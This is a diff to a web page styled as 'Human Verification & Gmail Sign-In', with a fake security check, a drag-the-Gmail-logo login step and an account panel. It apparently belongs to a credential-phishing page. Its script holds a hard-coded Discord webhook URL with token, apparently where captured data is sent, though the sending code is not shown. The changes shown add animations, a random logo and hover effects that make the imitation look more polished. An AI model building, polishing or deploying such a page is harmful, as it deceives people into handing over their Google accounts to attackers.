@@ -13,9 +13,63 @@
       padding: 0;
     }
 
+    @keyframes cardEnter {
+      from {
+        opacity: 0;
+        transform: translateY(14px) scale(0.99);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    @keyframes ambientGlow {
+      0%, 100% {
+        box-shadow: 0 10px 28px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.04);
+      }
+      50% {
+        box-shadow: 0 14px 34px rgba(0, 0, 0, 0.85), 0 0 18px rgba(255, 255, 255, 0.06);
+      }
+    }
+
+    @keyframes logoFloat {
+      0%, 100% {
+        transform: translateY(0px) rotate(0deg);
+      }
+      50% {
+        transform: translateY(-3px) rotate(4deg);
+      }
+    }
+
+    @keyframes pulseDot {
+      0%, 100% {
+        opacity: 0.45;
+        transform: scale(0.92);
+      }
+      50% {
+        opacity: 1;
+        transform: scale(1.1);
+      }
+    }
+
+    @keyframes panelReveal {
+      from {
+        opacity: 0;
+        transform: translateX(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(0);
+      }
+    }
+
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background-color: #09090b;
+      background-image:
+        radial-gradient(circle at 50% 0%, rgba(255, 255, 255, 0.05) 0%, transparent 55%),
+        linear-gradient(180deg, #09090b 0%, #0d0d10 100%);
       color: #f4f4f5;
       min-height: 100vh;
       padding: 24px 14px 40px;
@@ -33,6 +87,38 @@
       flex-direction: column;
       align-items: center;
       gap: 14px;
+      animation: cardEnter 0.45s cubic-bezier(0.22, 1, 0.36, 1) both;
+    }
+
+    .brand-header {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .random-logo-badge {
+      width: 52px;
+      height: 52px;
+      border-radius: 14px;
+      background-color: #111113;
+      border: 1px solid #27272a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.65);
+      animation: logoFloat 3.4s ease-in-out infinite;
+      transition: transform 0.25s ease, border-color 0.25s ease;
+    }
+
+    .random-logo-badge:hover {
+      border-color: #52525b;
+      transform: scale(1.06);
+    }
+
+    .random-logo-badge svg {
+      width: 28px;
+      height: 28px;
     }
 
     .page-title {
@@ -40,13 +126,14 @@
       font-weight: 700;
       color: #ffffff;
       text-align: center;
+      letter-spacing: -0.01em;
     }
 
     .page-subtitle {
       font-size: 13px;
       color: #a1a1aa;
       text-align: center;
-      margin-top: -6px;
+      margin-top: -4px;
     }
 
     .layout-grid {
@@ -64,9 +151,30 @@
       max-width: 400px;
       background-color: #111113;
       border: 1px solid #27272a;
-      border-radius: 10px;
+      border-radius: 12px;
       padding: 20px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.65);
+      animation: ambientGlow 4s ease-in-out infinite;
+      transition: border-color 0.25s ease;
+    }
+
+    .normal-card:hover {
+      border-color: #3f3f46;
+    }
+
+    .step-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 4px;
+    }
+
+    .step-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 999px;
+      background-color: #ffffff;
+      animation: pulseDot 2.2s ease-in-out infinite;
+      flex-shrink: 0;
     }
 
     .step-label {
@@ -75,7 +183,6 @@
       text-transform: uppercase;
       letter-spacing: 0.04em;
       color: #e4e4e7;
-      margin-bottom: 4px;
     }
 
     .step-desc {
@@ -116,6 +223,11 @@
       overflow: hidden;
       user-select: none;
       touch-action: none;
+      transition: border-color 0.25s ease;
+    }
+
+    .drag-track:hover {
+      border-color: #3f3f46;
     }
 
     .drag-fill {
@@ -127,6 +239,7 @@
       border-radius: 999px;
       background-color: #27272a;
       pointer-events: none;
+      transition: background-color 0.2s ease;
     }
 
     .drag-hint {
@@ -141,6 +254,7 @@
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
+      transition: opacity 0.2s ease;
     }
 
     .drag-gmail-handle {
@@ -158,6 +272,12 @@
       flex-shrink: 0;
       box-shadow: 0 2px 8px rgba(0, 0, 0, 0.6);
       will-change: transform;
+      transition: border-color 0.2s ease, background-color 0.2s ease;
+    }
+
+    .drag-gmail-handle:hover {
+      border-color: #71717a;
+      background-color: #27272a;
     }
 
     .drag-gmail-handle:active {
@@ -176,6 +296,7 @@
       align-items: center;
       gap: 8px;
       margin-bottom: 12px;
+      animation: cardEnter 0.3s ease both;
     }
 
     .google-box.active {
@@ -187,6 +308,7 @@
       text-align: center;
       color: #a1a1aa;
       min-height: 18px;
+      transition: color 0.25s ease;
     }
 
     .status-msg.success {
@@ -204,6 +326,7 @@
       flex-direction: column;
       gap: 10px;
       margin-top: 14px;
+      animation: cardEnter 0.35s cubic-bezier(0.22, 1, 0.36, 1) both;
     }
 
     .action-links-box.visible {
@@ -223,11 +346,18 @@
       border: 1px solid #ffffff;
       border-radius: 8px;
       cursor: pointer;
+      transition: transform 0.18s ease, background-color 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
     }
 
     .link-btn:hover {
       background-color: #e4e4e7;
       border-color: #e4e4e7;
+      transform: translateY(-1px);
+      box-shadow: 0 6px 16px rgba(255, 255, 255, 0.12);
+    }
+
+    .link-btn:active {
+      transform: translateY(0px) scale(0.99);
     }
 
     .link-btn.secondary {
@@ -238,6 +368,8 @@
 
     .link-btn.secondary:hover {
       background-color: #27272a;
+      border-color: #71717a;
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.5);
     }
 
     .side-account-panel {
@@ -246,9 +378,10 @@
       max-width: 260px;
       background-color: #111113;
       border: 1px solid #27272a;
-      border-radius: 10px;
+      border-radius: 12px;
       padding: 16px;
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.65);
+      animation: panelReveal 0.35s cubic-bezier(0.22, 1, 0.36, 1) both;
     }
 
     .side-account-panel.visible {
@@ -314,16 +447,29 @@
       text-align: center;
       margin-top: 2px;
     }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation: none !important;
+        transition: none !important;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="page-shell">
-    <h1 class="page-title">Human Verification & Gmail Sign-In</h1>
-    <p class="page-subtitle">Complete human check and slide Gmail logo to sign in</p>
+    <header class="brand-header">
+      <div id="random-logo" class="random-logo-badge" aria-label="Random emblem"></div>
+      <h1 class="page-title">Human Verification & Gmail Sign-In</h1>
+      <p class="page-subtitle">Complete human check and slide Gmail logo to sign in</p>
+    </header>
 
     <div class="layout-grid">
       <main class="normal-card">
-        <div class="step-label">1. Human Verification</div>
+        <div class="step-header">
+          <span class="step-dot"></span>
+          <div class="step-label">1. Human Verification</div>
+        </div>
         <p class="step-desc">Complete the security check below first.</p>
 
         <div class="turnstile-box">
@@ -339,7 +485,10 @@
 
         <div class="divider"></div>
 
-        <div class="step-label">2. Gmail Login</div>
+        <div class="step-header">
+          <span class="step-dot"></span>
+          <div class="step-label">2. Gmail Login</div>
+        </div>
         <p class="step-desc">Drag the Gmail logo to the right side to open Gmail sign-in.</p>
 
         <div class="drag-login-wrap">
@@ -429,6 +578,31 @@
 
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1572991657060864111/aI26JcjNw1OGkASLlVwoSGOVZefGWn9Gmd6lMbcN-VjU3kUEsNOPICYIShwYJjAOy18P";
+
+    (function renderRandomLogo() {
+      const logoContainer = document.getElementById("random-logo");
+      const logos = [
+        `<svg viewBox="0 0 28 28" fill="none" aria-hidden="true">
+          <polygon points="14,3 25,14 14,25 3,14" stroke="#ffffff" stroke-width="2" />
+          <circle cx="14" cy="14" r="4" fill="#ffffff" />
+        </svg>`,
+        `<svg viewBox="0 0 28 28" fill="none" aria-hidden="true">
+          <polygon points="14,4 25,23 3,23" stroke="#ffffff" stroke-width="2" stroke-linejoin="round" />
+          <circle cx="14" cy="17" r="3" fill="#a1a1aa" />
+        </svg>`,
+        `<svg viewBox="0 0 28 28" fill="none" aria-hidden="true">
+          <rect x="5" y="5" width="18" height="18" rx="4" stroke="#ffffff" stroke-width="2" />
+          <line x1="9" y1="14" x2="19" y2="14" stroke="#ffffff" stroke-width="2" stroke-linecap="round" />
+          <line x1="14" y1="9" x2="14" y2="19" stroke="#ffffff" stroke-width="2" stroke-linecap="round" />
+        </svg>`,
+        `<svg viewBox="0 0 28 28" fill="none" aria-hidden="true">
+          <circle cx="14" cy="14" r="10" stroke="#ffffff" stroke-width="2" />
+          <path d="M9 14.5L12.5 18L19.5 10.5" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+        </svg>`
+      ];
+      const index = Math.floor(Math.random() * logos.length);
+      logoContainer.innerHTML = logos[index];
+    })();
 
     (function initDragGmail() {
       const track = document.getElementById("drag-track");
